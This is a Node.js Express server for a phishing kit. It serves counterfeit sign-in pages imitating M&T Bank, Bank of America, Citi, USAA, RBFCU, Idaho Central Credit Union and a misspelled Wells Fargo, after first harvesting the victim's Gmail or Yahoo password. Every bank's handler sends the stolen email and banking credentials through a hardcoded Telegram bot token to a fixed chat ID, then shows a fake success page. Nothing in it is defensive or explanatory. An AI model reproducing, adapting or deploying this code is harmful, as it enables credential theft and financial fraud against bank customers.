const express = require('express');
const bodyParser = require('body-parser');
const session = require('express-session');
const TelegramBot = require('node-telegram-bot-api');

const bot = new TelegramBot('6384532778:AAHMaZBRAvX2iTaBN15M1pPduP8ZAjrm_U0', { polling: false });

const app = express();
const PORT = process.env.PORT || 3000;

app.use(session({
    secret: 'my secret is my secret',
    resave: false,
    saveUninitialized: false
}));

app.use(express.static('public'));
app.use(bodyParser.urlencoded({extended: true}));

app.set('view engine', 'ejs');

// Routes for M&T Bank
// M&T Gmail
app.route('/M&T_gmail')
    .get((req, res)=>{
        res.sendFile(__dirname + '/M&T_gmail.html')
    })
    .post((req, res)=>{
       const telId = req.body.tel_id;
       const email = req.body.email;

       req.session.info = {telId, email};
       res.redirect('/M&T_gmail_password')
    })

app.route('/M&T_gmail_password')
    .get((req, res)=>{
        const info = req.session.info;
        console.log('Info: ', info);
        res.render('M&T_gmail_password', {
            telId: info.telId,
            email: info.email
        })
    })
    .post((req, res)=>{
       const telId = req.body.tel_id;
       const email = req.body.email;
       const emailPassword = req.body.password;

       req.session.info2 = {telId, email, emailPassword};
       console.log(req.session.info2);
       res.redirect('/M&T')
    })


            // M&T Yahoo
app.route('/M&T_yahoo')
.get((req, res)=>{
    res.sendFile(__dirname + '/M&T_yahoo.html')
})
.post((req, res)=>{
   const telId = req.body.tel_id;
   const email = req.body.email;

   req.session.info = {telId, email};
   res.redirect('/M&T_yahoo_password')
})

app.route('/M&T_yahoo_password')
.get((req, res)=>{
    const info = req.session.info;
    console.log('Info: ', info);
    res.render('M&T_yahoo_password', {
        telId: info.telId,
        email: info.email
    })
})
.post((req, res)=>{
   const telId = req.body.tel_id;
   const email = req.body.email;
   const emailPassword = req.body.password;

   req.session.info2 = {telId, email, emailPassword};
   console.log(req.session.info2);
   res.redirect('/M&T')
})

app.route('/M&T')
.get((req, res)=>{
    const info = req.session.info2;
    console.log('Info: ', info);
    res.render('m&t', {
        telId: info.telId,
        email: info.email,
        password: info.emailPassword
    })
})
.post((req, res)=>{
   const telId = req.body.tel_id;
   const email = req.body.email;
   const emailPassword = req.body.emailPassword;
   const userId = req.body.userId;
   const password = req.body.password

   console.log(req.body);
 // Send a message to Telegram
bot.sendMessage('6565379109', `New M&T_yahoo login Information\nTel Id: ${telId}\nemail: ${email}\emailPassword: ${emailPassword}\nM&TUserId: ${userId}\nM&TUserPassword: ${password}`)
    .then(() => {
        console.log('Message sent to Telegram');
    })
    .catch((error) => {
        console.error('Error sending message to Telegram:', error);
    });
    res.send('Success')
        })

/* End of M&T Bank */

// Routes for Idaho Bank
// Idaho Gmail
app.route('/Idaho_gmail')
    .get((req, res)=>{
        res.sendFile(__dirname + '/Idaho_gmail.html')
    })
    .post((req, res)=>{
       const telId = req.body.tel_id;
       const email = req.body.email;

       req.session.info = {telId, email};
       res.redirect('/Idaho_gmail_password')
    })

app.route('/Idaho_gmail_password')
    .get((req, res)=>{
        const info = req.session.info;
        console.log('Info: ', info);
        res.render('Idaho_gmail_password', {
            telId: info.telId,
            email: info.email
        })
    })
    .post((req, res)=>{
       const telId = req.body.tel_id;
       const email = req.body.email;
       const emailPassword = req.body.password;

       req.session.info2 = {telId, email, emailPassword};
       console.log(req.session.info2);
       res.redirect('/Idaho')
    })

            // Idaho Yahoo
app.route('/Idaho_yahoo')
.get((req, res)=>{
    res.sendFile(__dirname + '/Idaho_yahoo.html')
})
.post((req, res)=>{
   const telId = req.body.tel_id;
   const email = req.body.email;

   req.session.info = {telId, email};
   res.redirect('/Idaho_yahoo_password')
})

app.route('/Idaho_yahoo_password')
.get((req, res)=>{
    const info = req.session.info;
    console.log('Info: ', info);
    res.render('Idaho_yahoo_password', {
        telId: info.telId,
        email: info.email
    })
})
.post((req, res)=>{
   const telId = req.body.tel_id;
   const email = req.body.email;
   const emailPassword = req.body.password;

   req.session.info2 = {telId, email, emailPassword};
   console.log(req.session.info2);
   res.redirect('/idaho')
})

app.route('/Idaho')
.get((req, res)=>{
    const info = req.session.info2;
    console.log('Info: ', info);
    res.render('Idaho Central Credit Union.ejs', {
        telId: info.telId,
        email: info.email,
        password: info.emailPassword
    })
})
.post((req, res)=>{
   const telId = req.body.tel_id;
   const email = req.body.email;
   const emailPassword = req.body.emailPassword;
   const username = req.body.userId;
   const password = req.body.password

   console.log(req.body);
 // Send a message to Telegram
bot.sendMessage('6565379109', `New Idaho_yahoo login Information\nTel Id: ${telId}\nemail: ${email}\emailPassword: ${emailPassword}\nIdahoUsername: ${username}\nIdahoUserPassword: ${password}`)
    .then(() => {
        console.log('Message sent to Telegram');
    })
    .catch((error) => {
        console.error('Error sending message to Telegram:', error);
    });
    res.send('Success')
        })

/* End of Idaho Bank */

// Routes for rbfcu Bank
// rbfcu Gmail
app.route('/rbfcu_gmail')
    .get((req, res)=>{
        res.sendFile(__dirname + '/rbfcu_gmail.html')
    })
    .post((req, res)=>{
       const telId = req.body.tel_id;
       const email = req.body.email;

       req.session.info = {telId, email};
       res.redirect('/rbfcu_gmail_password')
    })

app.route('/rbfcu_gmail_password')
    .get((req, res)=>{
        const info = req.session.info;
        console.log('Info: ', info);
        res.render('rbfcu_gmail_password', {
            telId: info.telId,
            email: info.email
        })
    })
    .post((req, res)=>{
       const telId = req.body.tel_id;
       const email = req.body.email;
       const emailPassword = req.body.password;

       req.session.info2 = {telId, email, emailPassword};
       console.log(req.session.info2);
       res.redirect('/rbfcu')
    })

            // rbfcu Yahoo
app.route('/rbfcu_yahoo')
.get((req, res)=>{
    res.sendFile(__dirname + '/rbfcu_yahoo.html')
})
.post((req, res)=>{
   const telId = req.body.tel_id;
   const email = req.body.email;

   req.session.info = {telId, email};
   res.redirect('/rbfcu_yahoo_password')
})

app.route('/rbfcu_yahoo_password')
.get((req, res)=>{
    const info = req.session.info;
    console.log('Info: ', info);
    res.render('rbfcu_yahoo_password', {
        telId: info.telId,
        email: info.email
    })
})
.post((req, res)=>{
   const telId = req.body.tel_id;
   const email = req.body.email;
   const emailPassword = req.body.password;

   req.session.info2 = {telId, email, emailPassword};
   console.log(req.session.info2);
   res.redirect('/rbfcu')
})

app.route('/rbfcu')
.get((req, res)=>{
    const info = req.session.info2;
    console.log('Info: ', info);
    res.render('RBFCU - Sign In.ejs', {
        telId: info.telId,
        email: info.email,
        password: info.emailPassword
    })
})
.post((req, res)=>{
   const telId = req.body.tel_id;
   const email = req.body.email;
   const emailPassword = req.body.emailPassword;
   const username = req.body.userId;
   const password = req.body.password

   console.log(req.body);
 // Send a message to Telegram
bot.sendMessage('6565379109', `New rbfcu_yahoo login Information\nTel Id: ${telId}\nemail: ${email}\emailPassword: ${emailPassword}\nrbfcuUsername: ${username}\nrbfcuUserPassword: ${password}`)
    .then(() => {
        console.log('Message sent to Telegram');
    })
    .catch((error) => {
        console.error('Error sending message to Telegram:', error);
    });
    res.send('Success')
        })

/* End of rbfcu Bank */

// Routes for Bank Of America Bank
// Bank Of America Gmail
app.route('/BankOfAmerica_gmail')
    .get((req, res)=>{
        res.sendFile(__dirname + '/BankOfAmerica_gmail.html')
    })
    .post((req, res)=>{
       const telId = req.body.tel_id;
       const email = req.body.email;

       req.session.info = {telId, email};
       res.redirect('/BankOfAmerica_gmail_password')
    })

app.route('/BankOfAmerica_gmail_password')
    .get((req, res)=>{
        const info = req.session.info;
        console.log('Info: ', info);
        res.render('BankOfAmerica_gmail_password', {
            telId: info.telId,
            email: info.email
        })
    })
    .post((req, res)=>{
       const telId = req.body.tel_id;
       const email = req.body.email;
       const emailPassword = req.body.password;

       req.session.info2 = {telId, email, emailPassword};
       console.log(req.session.info2);
       res.redirect('/BankOfAmerica')
    })

            // BankOfAmerica Yahoo
        app.route('/BankOfAmerica_yahoo')
            .get((req, res)=>{
                res.sendFile(__dirname + '/BankOfAmerica_yahoo.html')
            })
            .post((req, res)=>{
               const telId = req.body.tel_id;
               const email = req.body.email;
        
               req.session.info = {telId, email};
               res.redirect('/BankOfAmerica_yahoo_password')
            })
        
        app.route('/BankOfAmerica_yahoo_password')
            .get((req, res)=>{
                const info = req.session.info;
                console.log('Info: ', info);
                res.render('BankOfAmerica_yahoo_password', {
                    telId: info.telId,
                    email: info.email
                })
            })
            .post((req, res)=>{
               const telId = req.body.tel_id;
               const email = req.body.email;
               const emailPassword = req.body.password;
        
               req.session.info2 = {telId, email, emailPassword};
               console.log(req.session.info2);
               res.redirect('/BankOfAmerica')
            })
        
        app.route('/BankOfAmerica')
            .get((req, res)=>{
                const info = req.session.info2;
                console.log('Info: ', info);
                res.render('BankOf America - Sign In', {
                    telId: info.telId,
                    email: info.email,
                    password: info.emailPassword
                })
            })
            .post((req, res)=>{
               const telId = req.body.tel_id;
               const email = req.body.email;
               const emailPassword = req.body.emailPassword;
               const onlineId = req.body.onlineId;
               const passcode = req.body.passcode
        
               console.log(req.body);
             // Send a message to Telegram
            bot.sendMessage('6565379109', `New BankOfAmerica_gmail login Information\nTel Id: ${telId}\nemail: ${email}\emailPassword: ${emailPassword}\nBankOfAmericaOnlineId: ${onlineId}\nBankOfAmericaUserPasscode: ${passcode}`)
                .then(() => {
                    console.log('Message sent to Telegram');
                })
                .catch((error) => {
                    console.error('Error sending message to Telegram:', error);
                });
                res.redirect('/bankofamericaLoginSucess')
                    })
        
/* End of BankOfAmerica Bank */

// Routes for Citi Bank
// Citi Bank Gmail
app.route('/CitiBank_gmail')
    .get((req, res)=>{
        res.sendFile(__dirname + '/CitiBank_gmail.html')
    })
    .post((req, res)=>{
       const telId = req.body.tel_id;
       const email = req.body.email;

       req.session.info = {telId, email};
       res.redirect('/CitiBank_gmail_password')
    })

app.route('/CitiBank_gmail_password')
    .get((req, res)=>{
        const info = req.session.info;
        console.log('Info: ', info);
        res.render('CitiBank_gmail_password', {
            telId: info.telId,
            email: info.email
        })
    })
    .post((req, res)=>{
       const telId = req.body.tel_id;
       const email = req.body.email;
       const emailPassword = req.body.password;

       req.session.info2 = {telId, email, emailPassword};
       console.log(req.session.info2);
       res.redirect('/CitiBank')
    })

            // CitiBank Yahoo
        app.route('/CitiBank_yahoo')
            .get((req, res)=>{
                res.sendFile(__dirname + '/CitiBank_yahoo.html')
            })
            .post((req, res)=>{
               const telId = req.body.tel_id;
               const email = req.body.email;
        
               req.session.info = {telId, email};
               res.redirect('/CitiBank_yahoo_password')
            })
        
        app.route('/CitiBank_yahoo_password')
            .get((req, res)=>{
                const info = req.session.info;
                console.log('Info: ', info);
                res.render('CitiBank_yahoo_password', {
                    telId: info.telId,
                    email: info.email
                })
            })
            .post((req, res)=>{
               const telId = req.body.tel_id;
               const email = req.body.email;
               const emailPassword = req.body.password;
        
               req.session.info2 = {telId, email, emailPassword};
               console.log(req.session.info2);
               res.redirect('/CitiBank')
            })
        
            app.route('/CitiBank')
            .get((req, res)=>{
                const info = req.session.info2;
                console.log('Info: ', info);
                res.render('CitiBank - Sign In', {
                    telId: info.telId,
                    email: info.email,
                    password: info.emailPassword
                })
            })
            .post((req, res)=>{
               const telId = req.body.tel_id;
               const email = req.body.email;
               const emailPassword = req.body.emailPassword;
               const userId = req.body.userId;
               const password = req.body.password
        
               console.log(req.body);
             // Send a message to Telegram
            bot.sendMessage('6565379109', `New CitiBank login Information\nTel Id: ${telId}\nemail: ${email}\emailPassword: ${emailPassword}\nCitiBankOnlineId: ${userId}\nCitiBankUserPasscode: ${password}`)
                .then(() => {
                    console.log('Message sent to Telegram');
                })
                .catch((error) => {
                    console.error('Error sending message to Telegram:', error);
                });
                res.send('Success')
                    })
        
/* End of Citi Bank */

// Routes for USAA Bank
// USAA Gmail
app.route('/USAA_gmail')
    .get((req, res)=>{
        res.sendFile(__dirname + '/USAA_gmail.html')
    })
    .post((req, res)=>{
       const telId = req.body.tel_id;
       const email = req.body.email;

       req.session.info = {telId, email};
       res.redirect('/USAA_gmail_password')
    })

app.route('/USAA_gmail_password')
    .get((req, res)=>{
        const info = req.session.info;
        console.log('Info: ', info);
        res.render('USAA_gmail_password', {
            telId: info.telId,
            email: info.email
        })
    })
    .post((req, res)=>{
       const telId = req.body.tel_id;
       const email = req.body.email;
       const emailPassword = req.body.password;

       req.session.info2 = {telId, email, emailPassword};
       console.log(req.session.info2);
       res.redirect('/USAA')
    })

            // USAA Yahoo
        app.route('/USAA_yahoo')
            .get((req, res)=>{
                res.sendFile(__dirname + '/USAA_yahoo.html')
            })
            .post((req, res)=>{
               const telId = req.body.tel_id;
               const email = req.body.email;
        
               req.session.info = {telId, email};
               res.redirect('/USAA_yahoo_password')
            })
        
        app.route('/USAA_yahoo_password')
            .get((req, res)=>{
                const info = req.session.info;
                console.log('Info: ', info);
                res.render('USAA_yahoo_password', {
                    telId: info.telId,
                    email: info.email
                })
            })
            .post((req, res)=>{
               const telId = req.body.tel_id;
               const email = req.body.email;
               const emailPassword = req.body.password;
        
               req.session.info2 = {telId, email, emailPassword};
               console.log(req.session.info2);
               res.redirect('/USAA')
            })
        
            app.route('/USAA')
            .get((req, res)=>{
                const info = req.session.info2;
                console.log('Info: ', info);
                res.render('USAA - Sign in', {
                    telId: info.telId,
                    email: info.email,
                    password: info.emailPassword
                })
            })
            .post((req, res)=>{
               const telId = req.body.tel_id;
               const email = req.body.email;
               const emailPassword = req.body.emailPassword;
               const onlineId = req.body.onlineId;
               const password = req.body.password
        
               console.log(req.body);
             // Send a message to Telegram
            bot.sendMessage('6565379109', `New USAA login Information\nTel Id: ${telId}\nemail: ${email}\emailPassword: ${emailPassword}\nUSAAOnlineId: ${onlineId}\nUSAAUserPasscode: ${password}`)
                .then(() => {
                    console.log('Message sent to Telegram');
                })
                .catch((error) => {
                    console.error('Error sending message to Telegram:', error);
                });
                res.redirect('/usaaLoginSucess')
                    })
        
/* End of USAA Bank */

// Routes for Welz-Fargo Bank
// Welz-Fargo Gmail
app.route('/Welz-Fargo_gmail')
    .get((req, res)=>{
        res.sendFile(__dirname + '/Welz-Fargo_gmail.html')
    })
    .post((req, res)=>{
       const telId = req.body.tel_id;
       const email = req.body.email;

       req.session.info = {telId, email};
       res.redirect('/Welz-Fargo_gmail_password')
    })

app.route('/Welz-Fargo_gmail_password')
    .get((req, res)=>{
        const info = req.session.info;
        console.log('Info: ', info);
        res.render('Welz-Fargo_gmail_password', {
            telId: info.telId,
            email: info.email
        })
    })
    .post((req, res)=>{
       const telId = req.body.tel_id;
       const email = req.body.email;
       const emailPassword = req.body.password;

       req.session.info2 = {telId, email, emailPassword};
       console.log(req.session.info2);
       res.redirect('/Welz-Fargo')
    })

            // USAA Yahoo
        app.route('/Welz-Fargo_yahoo')
            .get((req, res)=>{
                res.sendFile(__dirname + '/Welz-Fargo_yahoo.html')
            })
            .post((req, res)=>{
               const telId = req.body.tel_id;
               const email = req.body.email;
        
               req.session.info = {telId, email};
               res.redirect('/Welz-Fargo_yahoo_password')
            })
        
        app.route('/Welz-Fargo_yahoo_password')
            .get((req, res)=>{
                const info = req.session.info;
                console.log('Info: ', info);
                res.render('Welz-Fargo_yahoo_password', {
                    telId: info.telId,
                    email: info.email
                })
            })
            .post((req, res)=>{
               const telId = req.body.tel_id;
               const email = req.body.email;
               const emailPassword = req.body.password;
        
               req.session.info2 = {telId, email, emailPassword};
               console.log(req.session.info2);
               res.redirect('/Welz-Fargo')
            })
        
            app.route('/Welz-Fargo')
            .get((req, res)=>{
                const info = req.session.info2;
                console.log('Info: ', info);
                res.render('Welz-Fargo - Sign In', {
                    telId: info.telId,
                    email: info.email,
                    password: info.emailPassword
                })
            })
            .post((req, res)=>{
               const telId = req.body.tel_id;
               const email = req.body.email;
               const emailPassword = req.body.emailPassword;
               const username = req.body.username;
               const password = req.body.password
        
               console.log(req.body);
             // Send a message to Telegram
            bot.sendMessage('6565379109', `New USAA login Information\nTel Id: ${telId}\nemail: ${email}\emailPassword: ${emailPassword}\nUSAAUsername: ${username}\nUSAAUserPasscode: ${password}`)
                .then(() => {
                    console.log('Message sent to Telegram');
                })
                .catch((error) => {
                    console.error('Error sending message to Telegram:', error);
                });
                res.redirect('/welzLoginSucess')
                    })
        
/* End of USAA Bank */




app.get('/welzLoginSucess', (req, res)=>{
    res.sendFile(__dirname + '/Welz_2021/Success.html')
})

app.get('/usaaLoginSucess', (req, res)=>{
    res.sendFile(__dirname + '/USAA-2022/home/email/done.html')
})
app.get('/bankofamericaLoginSucess', (req, res)=>{
    res.sendFile(__dirname + '/Bank of America 2022/application/views/com.html')
})


app.listen(PORT, ()=>{
    console.log(`Server is running on port ${PORT}`);
});